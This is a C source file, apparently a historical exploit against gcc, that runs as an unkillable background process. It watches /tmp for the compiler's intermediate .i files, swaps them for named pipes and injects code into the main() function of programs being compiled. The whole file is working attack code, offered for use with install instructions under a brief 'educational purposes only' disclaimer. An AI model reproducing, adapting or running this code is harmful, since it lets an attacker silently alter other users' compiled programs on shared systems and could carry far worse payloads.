/*
  Another gcc exploit by Michal Zalewski <lcamtuf@staszic.waw.pl>
  ---------------------------------------------------------------
  = for educational purposes only, please don't abuse it anyway =

  Installation:
    make; ./evil

  Killing:
    rm /tmp/.myson

  Advantages:
    - now it's even faster and even more usable,
    - pipe timeout has been implemented,
    - auto-background mode, almost unkillable,
    - /tmp lockfile.
    
  Disadvantages:
    - incerased CPU usage,
    - smart skipping of 'dead' *.i files isn't implemented (yet),
    - it still modifies only *.i files, not asm code directly,
    - dirty code ;)

  To do:
    - smart *.i skipping (function kaboom + string array),
    - assembler code analysis,
    - process-activated scandir() (to decerase cpu usage).

*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <dirent.h>

#ifndef CC1
#error - Please use make to compile me.
#endif

#define CHECKPOINT ".myboy"
#define TIMEOUT 5

int pass=1;
char buf[1000];

void kaboom(int x)
{
  // Nope yet.
  system("kill -9 `ps|grep \"cca\"|awk '{print $1}'` &>/dev/null");
}

int infect(struct dirent *s)
{
  if ((strncmp("cca",s->d_name,3)!=0)) {
    if (!(strncmp(s->d_name,CHECKPOINT,6))) pass=1;
    return -1;
  }
  if (s->d_name[9]!='i') return -1;
  s->d_name[9]='s';
  mknod(s->d_name, 0666 | S_IFIFO,0);
  s->d_name[9]='i';
  signal(SIGALRM,kaboom);
  // Ripped from sh version :)
  sprintf(buf,"cat %s|awk 'match($2,\"main\")==1{x=1};y!=1&&x==1&&match"
              "($1,\"\\\\(\")>0&&match($2,\"main\")==0{y=1;print \" printf"
              "(\\\"\\\\n*** THIS PROGRAM HAS BEEN INFECTED ***\\\\n\\\\n"
              "\\\"); \"};{print $0}'>.%s; " CC1 " .%s &>/dev/null;rm -f %s"
              " .%s &>/dev/null",s->d_name,s->d_name,s->d_name,s->d_name,
              s->d_name);
  alarm(TIMEOUT);
  system(buf);
  alarm(0);
  s->d_name[9]='s';
  signal(SIGALRM,kaboom);
  sprintf(buf,"cat %s >/dev/null;cat .%s >%s;rm -f %s .%s &>/dev/null",
              s->d_name,s->d_name,s->d_name,s->d_name,s->d_name);
  alarm(TIMEOUT);
  system(buf);
  alarm(0);
  sleep(1);
  return -1;
}

int foo(struct dirent **a,struct dirent **b)
{
  // Nope.
}

int main(int argc, char* argv[])
{
  int a=0;
  struct dirent **x;
  printf("Forking into background...\n");
  if (fork()) exit(0);
  if (open("/tmp/" CHECKPOINT ,O_RDONLY)<0) {
    close(open("/tmp/" CHECKPOINT,O_CREAT));
  } else {
    printf("Am I already active? Try again NOW.\n");
    system("rm -f /tmp/" CHECKPOINT " &>/dev/null");
    return 0;
  }
  chdir("/tmp");
  umask(0);
  for (;a<25;a++) signal(a,SIG_IGN);
  while (pass) {
    pass=0;
    scandir("/tmp",&x,infect,foo);
  }
  printf("Aghhrrr, I'm dying!!!\n");
  return 0;
}
